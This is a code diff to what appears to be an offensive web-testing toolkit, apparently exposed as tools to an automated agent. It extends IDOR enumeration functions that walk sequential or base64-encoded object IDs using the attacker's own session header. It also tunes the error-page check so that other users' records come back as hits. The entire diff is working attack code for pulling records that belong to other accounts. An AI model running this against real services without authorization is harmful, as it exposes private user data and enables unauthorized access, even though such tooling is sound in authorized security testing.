@@ -35,11 +35,20 @@ def idor_enum(url_template, start=1, stop=100, step=1, pad=None,
         return verdict("idor_enum", False, "url_template lacks {ID} placeholder")
     headers = {}
     if attacker_header:
-        k, _, v = attacker_header.partition(":")
-        if v:
-            headers = {k.strip(): v.strip()}
-        else:
-            headers = {"Authorization": f"Bearer {attacker_header.strip()}"}
+        if isinstance(attacker_header, dict):
+            headers = dict(attacker_header)
+        elif isinstance(attacker_header, str):
+            if attacker_header.strip().startswith("{"):
+                try:
+                    headers = json.loads(attacker_header)
+                except Exception:
+                    headers = {}
+            if not headers:
+                k, _, v = attacker_header.partition(":")
+                if v:
+                    headers = {k.strip(): v.strip()}
+                else:
+                    headers = {"Authorization": f"Bearer {attacker_header.strip()}"}
 
     # fingerprint the attacker's OWN record first (shape reference)
     own_body = None
@@ -88,12 +97,29 @@ def _different(own, other):
               "url_template": {"type": "string", "description": "URL with {ID} where the b64 token goes"},
               "start": {"type": "integer", "default": 1},
               "stop": {"type": "integer", "default": 50},
+              "attacker_header": {"type": "string", "description": "auth header for YOUR session, e.g. 'Authorization: Bearer ey...' or 'Cookie: sid=...'"},
               "variant": {"type": "string", "enum": ["plain", "b64", "b64url"], "default": "b64"}},
               "required": ["url_template"]},
           danger="loud")
-def idor_b64_walk(url_template, start=1, stop=50, variant="b64"):
+def idor_b64_walk(url_template, start=1, stop=50, variant="b64", attacker_header=None):
     if "{ID}" not in url_template:
         return verdict("idor_b64_walk", False, "url_template lacks {ID} placeholder")
+    headers = {}
+    if attacker_header:
+        if isinstance(attacker_header, dict):
+            headers = dict(attacker_header)
+        elif isinstance(attacker_header, str):
+            if attacker_header.strip().startswith("{"):
+                try:
+                    headers = json.loads(attacker_header)
+                except Exception:
+                    headers = {}
+            if not headers:
+                k, _, v = attacker_header.partition(":")
+                if v:
+                    headers = {k.strip(): v.strip()}
+                else:
+                    headers = {"Authorization": f"Bearer {attacker_header.strip()}"}
     hits, checked = [], 0
     for i in range(start, stop + 1):
         raw = str(i)
@@ -103,7 +129,7 @@ def idor_b64_walk(url_template, start=1, stop=50, variant="b64"):
             tok = base64.urlsafe_b64encode(raw.encode()).decode().rstrip("=")
         else:
             tok = raw
-        st, body, _dt = paced_send(url_template.replace("{ID}", tok))
+        st, body, _dt = paced_send(url_template.replace("{ID}", tok), headers=headers)
         checked += 1
         if st == 200 and body and not _is_error_page(body):
             hits.append({"id_raw": raw, "token": tok, "size": len(body),
@@ -115,5 +141,14 @@ def idor_b64_walk(url_template, start=1, stop=50, variant="b64"):
 
 
 def _is_error_page(body):
+    # Ω1.4 (audit-6): Distinguish real error pages from user profiles containing 'login' field
     low = body.lower()
-    return any(m in low for m in ("not found", "unauthorized", "forbidden", "error", "login")) and len(body) < 900
+    # Check for empty response or generic error JSON
+    if low.strip() in ("{}", "[]", '{"data": null}', "null"):
+        return True
+    # HTML error page clues
+    if any(m in low for m in ("<title>404", "<title>not found", "<title>unauthorized", "<title>login", "<title>error")):
+        return True
+    # Common error messages
+    error_phrases = ("not found", "unauthorized", "access denied", "forbidden", "invalid id", "record not found")
+    return any(p in low for p in error_phrases) and len(body) < 300
